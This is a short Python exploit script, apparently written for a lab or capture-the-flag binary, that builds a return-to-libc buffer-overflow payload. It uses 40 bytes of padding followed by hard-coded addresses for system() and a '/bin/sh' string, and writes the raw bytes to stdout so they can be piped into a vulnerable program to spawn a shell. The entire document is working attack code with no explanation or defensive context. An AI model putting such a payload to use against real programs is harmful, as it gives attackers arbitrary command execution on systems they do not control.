import struct
import sys

system = [0xf7e10410, 0x7fff]
second_return = [0x0,0x0]
bin_sh = [0xf7f725aa,0x7fff]

padding = 'A'*40
ret_addr = struct.pack("<2I",*system)
print(ret_addr)
second_return_addr = struct.pack("<2I",*second_return)
bin_sh_addr = struct.pack("<2I",*bin_sh)
password = "bbbbbbbb"

def create_exploit_str(lst):
    exp = bytearray()
    for element in lst:
        if isinstance(element,str):
            exp.extend(element.encode('utf-8'))
        elif isinstance(element,bytes):
            exp.extend(element)
        else:
            raise ValueError
    return bytes(exp)

ordering = [padding,ret_addr,second_return_addr,bin_sh_addr]
out = create_exploit_str(ordering)

sys.stdout.buffer.write(out)